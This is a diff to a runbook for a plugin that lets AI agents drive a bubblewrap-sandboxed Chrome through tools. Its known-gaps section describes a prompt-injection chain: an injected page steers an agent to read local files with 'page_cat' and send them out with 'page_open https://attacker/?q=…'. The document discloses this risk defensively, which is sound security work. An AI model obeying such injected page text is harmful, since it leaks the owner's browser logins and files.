@@ -5,8 +5,9 @@ owner watches and uses its window live in a Report `window` block; agents read
 and drive the same window with five tools. Design: issue #2530,
 `docs/architecture/2530-agent-desktop.md`.
 
-There is no GPU, no FFmpeg/PipeWire/GStreamer and no new apt package. Chrome is
-not bundled: installing it is a step of this runbook.
+There is no GPU and no FFmpeg/PipeWire/GStreamer. Chrome always runs inside a
+bubblewrap (`bwrap`) sandbox, so the `bubblewrap` package must be installed.
+Chrome is not bundled: installing it is a step of this runbook.
 
 ## How it works
 
@@ -18,6 +19,7 @@ libraries together and speaks only the plugin protocol:
 - `chrome-control`: launches Chrome on that display with a persistent profile
   and an allowlisted environment, and drives the visible tab over CDP on a
   pipe (no debugging port).
+- `sandbox`: the bwrap policy Chrome runs inside (see [Sandbox](#sandbox)).
 - `window-stream`: streams one window as JPEG frames over a WebSocket and
   carries the viewer's pointer and keys back.
 
@@ -31,12 +33,15 @@ stops when the plugin stops:
 - stdin EOF (the kernel went away) or SIGTERM: `desktop` asks Chrome over CDP
   to close (`Browser.close`), as closing its last window does, so Chrome
   writes its cookies (a page whose main thread is busy can still lose its
-  last one); if it has not exited after five seconds it gets SIGTERM, and two
-  seconds later its process group gets SIGKILL;
+  last one); if it has not exited after five seconds its sandbox gets
+  SIGTERM, which ends the sandbox at once, and two seconds later the
+  sandbox's process group gets SIGKILL;
 - a SIGKILL of `desktop`, which is what the kernel's plugin stop, disable,
-  reload and server restart send: Chrome dies through `PR_SET_PDEATHSIG` and
-  its helpers exit with it. Nothing is written in order then, so cookies set
-  in the last seconds before it can be lost (see the known gaps).
+  reload and server restart send: bwrap dies through `PR_SET_PDEATHSIG`, its
+  init through `--die-with-parent`, and the kernel ends every process left in
+  the sandbox's pid namespace, Chrome and its helpers. Nothing is written in
+  order then, so cookies set in the last seconds before it can be lost (see
+  the known gaps).
 
 If the owner closes Chrome's last window, the app is not running until the
 next demand. A viewer always shows the app's newest open window: when Chrome
@@ -49,10 +54,50 @@ Files, all under `<plugins_data_dir>/desktop/` (directories 0700):
 |---|---|
 | `run/<pid>-<tag>/wayland-0` | this process's Wayland socket (0600) |
 | `http.sock` | the stream socket (0600) |
-| `profiles/chrome/` | Chrome's profile: cookies and logins |
-| `home/` | Chrome's `HOME`: crash database, NSS state |
+| `profiles/chrome/` | Chrome's profile: cookies and logins (`/data/profile` inside the sandbox) |
+| `home/` | Chrome's `HOME`: crash database, NSS state (`/data/home` inside) |
 
 The profile survives plugin, server and host restarts.
+
+## Sandbox
+
+Chrome never runs outside a bwrap sandbox (#2565). Inside it, Chrome sees
+only fixed paths, none of which mirror a host path:
+
+| Inside | What | Access |
+|---|---|---|
+| `/opt/chrome` | the directory holding `chrome_binary` (after links) | read-only |
+| `/data/profile` | `profiles/chrome/` | read-write |
+| `/data/home` | `home/`, Chrome's `HOME` | read-write |
+| `/run/wayland/wayland-0` | this process's Wayland socket | connect |
+| `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64` | system programs, libraries and fonts | read-only |
+| `/etc` | only `fonts/`, `ssl/certs/`, `resolv.conf`, `hosts`, `nsswitch.conf`, `localtime` and `ld.so.cache` | read-only |
+| `/proc`, `/dev`, `/tmp`, `/dev/shm` | its own: a fresh proc, minimal devices, private tmpfs | |
+
+Everything else, the user's home, repositories, `~/.codex`, the service's
+env file and the rest of the plugin's data directory, does not exist for
+Chrome: a `file://` URL to it shows Chrome's "ERR_FILE_NOT_FOUND" page. Chrome
+gets its own user, mount, pid, IPC, UTS and cgroup namespaces, a new session,
+and `PATH=/usr/bin`; it shares the host's network (see the known gaps).
+Chrome's own sandbox still runs inside it.
+
+Keep Chrome in a directory of its own: everything beside `chrome_binary` is
+visible to Chrome.
+
+Requirements:
+
+- bubblewrap at `bwrap_binary` (default `/usr/bin/bwrap`; Debian and Ubuntu
+  package `bubblewrap`);
+- unprivileged user namespaces: `sysctl kernel.unprivileged_userns_clone` is 1
+  where that knob exists, and on Ubuntu 24.04 or later
+  `kernel.apparmor_restrict_unprivileged_userns` is 0 (or an AppArmor profile
+  lets bwrap create them);
+- a merged-`/usr` host (`/bin`, `/lib` and `/lib64` link into `/usr`).
+
+It fails closed. Without an executable `bwrap_binary` the plugin refuses its
+`initialize`, so the kernel reports it failed to start. A sandbox that cannot
+start (no user namespaces, for example) makes `page_open` and the stream fail
+with "Chrome exited during launch"; Chrome never runs in its place.
 
 ## Tools
 
@@ -110,8 +155,8 @@ present; check that nothing is missing:
 ldd <chrome_binary> | grep 'not found'   # must print nothing
 ```
 
-Chrome's sandbox needs unprivileged user namespaces
-(`sysctl kernel.unprivileged_userns_clone` is 1 where that knob exists).
+Chrome's sandbox and bwrap need unprivileged user namespaces (see
+[Sandbox](#sandbox)).
 
 Chrome for Testing 151 shows a closable "unsupported command-line flag" bar
 (about 56 px) for `--disable-blink-features=AutomationControlled`, which keeps
@@ -146,6 +191,7 @@ does not start it and reports the missing key.
 | Key | Default | Meaning |
 |---|---|---|
 | `chrome_binary` | required | absolute path of the Chrome executable |
+| `bwrap_binary` | `/usr/bin/bwrap` | absolute path of bubblewrap, which Chrome always runs inside |
 | `width`, `height` | 1280, 800 | the window size; every window is maximized to it |
 | `max_fps` | 15 | frame rate of a watched window; an unwatched one draws once a second |
 | `proxy_server` | unset | `<scheme>://<host>:<port>` (http, https, socks4, socks5) for every Chrome request |
@@ -191,25 +237,24 @@ The MVP's last acceptance is manual, on the owner's own account:
 6. A4 on Google Chrome stable. With Chrome running, record the launch:
 
    ```sh
-   B=$(pgrep -o -f -- "--user-data-dir=$PLUGINS_DATA/desktop/profiles/chrome")
-   pgrep -a -g "$B" | cut -c1-100 > /tmp/a4-group.txt    # process group: browser, zygotes, renderers…
-   pgrep -af "chrome_crashpad_handler.*$PLUGINS_DATA/desktop/home" > /tmp/a4-crashpad.txt
-   wc -l /tmp/a4-group.txt /tmp/a4-crashpad.txt          # both must be non-empty
+   D=$(pgrep -f -- "/bin/desktop$")                    # the plugin process
+   B=$(pgrep -P "$D" -x bwrap)                         # its sandbox
+   pstree -p "$B" | grep -o '([0-9]*)' | tr -d '()' > /tmp/a4-sandbox.txt
+   wc -l < /tmp/a4-sandbox.txt                         # bwrap, its init, Chrome, helpers
    ```
 
    Disable the plugin (`POST /api/plugins/desktop/disable`), wait 5 seconds,
-   and run both `pgrep` commands again: neither may print a process. (`pgrep
-   -g` selects a process group; `ps -g` would select a session and record
-   nothing.)
+   and run `ps -o pid=,args= -p "$(paste -sd, /tmp/a4-sandbox.txt)"`: it may
+   print no process.
 
 Record the result in the PR.
 
 ## Known gaps
 
-- **Same user, no isolation.** Agents and Chrome run as the same OS user. Any
-  local process of that user can read the profile, and a Worker's shell can
-  reach `http.sock`. The plugin keeps the browser off the network and out of
-  service secrets; it is no boundary against local code of the same user.
+- **Same user.** Agents and Chrome run as the same OS user. The sandbox keeps
+  Chrome away from the user's files, but not the other way round: any local
+  process of that user can read the profile, and a Worker's shell can reach
+  `http.sock`. It is no boundary against local code of the same user.
 - **Tool scope.** The tools appear on every unbound Track for the Planner and
   Workers. Narrowing to bound Tracks is one manifest field
   (`agent_tools_scope: "bound-track"`).
@@ -219,22 +264,27 @@ Record the result in the PR.
   text that steers a model can drive them (prompt injection). Codex 0.159.2
   also applies the grant to loaded threads at the kernel's reload. Disabling
   the plugin is the off switch.
-- **A steered agent can read a local file and send it out, unasked.** With
-  delegation, nothing stops this chain: an injected page makes the agent type
-  `file:///…` with `window_input`, read it with `page_cat`, and send it with
-  `page_open https://attacker/?q=…`. Before delegation, the two write steps
-  were each asked (refused under `never`; the Planner's `full` tier approves
-  prompts anyway), and `page_cat` was never asked. Enable the plugin only if
-  you accept this; the Chrome profile, the browser's logins and the user's
-  files are within its reach.
+- **A steered agent can still read what the sandbox holds and send it out,
+  unasked.** With delegation, nothing stops this chain: an injected page makes
+  the agent type `file:///…` with `window_input`, read it with `page_cat`, and
+  send it with `page_open https://attacker/?q=…`. The sandbox narrows what
+  that reaches to Chrome's own files (see [Sandbox](#sandbox)): the user's
+  home, repositories and secrets are not there, but the profile is
+  (`file:///data/profile/`), and with it the browser's logins. Before
+  delegation, the two write steps were each asked (refused under `never`; the
+  Planner's `full` tier approves prompts anyway), and `page_cat` was never
+  asked.
 - **`page_open` takes web URLs only, but that is no boundary.** It refuses
   `file:`, `chrome:` and other schemes, yet `window_input` can type any
   address into Chrome's address bar, `file:///` included, and `page_cat` then
-  reads it. This is the same-user gap above: the Planner can read what the
-  OS user can read.
-- **Outbound from pages.** Pages run script on the host and can try loopback
-  services. Only Chrome's Local Network Access checks stand between them, and
-  `window_input` can click through their prompts.
+  reads it, within the sandbox.
+- **Accounts.** A steered agent acts as the owner on every site the profile
+  is logged in to (X, Google). The sandbox does not cover that; it needs
+  approval prompts or tool scoping.
+- **Network.** The sandbox shares the host's network (#2565 S2 narrows it).
+  Pages can try loopback and LAN services, the kernel's API included; only
+  Chrome's Local Network Access checks stand between them, and `window_input`
+  can click through their prompts.
 - **Prompt injection.** Page text reaches models. Disabling the plugin is the
   immediate off switch.
 - **A stop can lose the last cookies.** The kernel stops a plugin with
@@ -269,4 +319,5 @@ Record the result in the PR.
   larger than their window (clipped).
 - A server restart or deploy restarts Chrome; the last session is restored
   (see above) and logins stay.
-- Chrome install and updates are manual. Linux only.
+- Chrome install and updates are manual. Linux only, with bubblewrap and
+  unprivileged user namespaces.
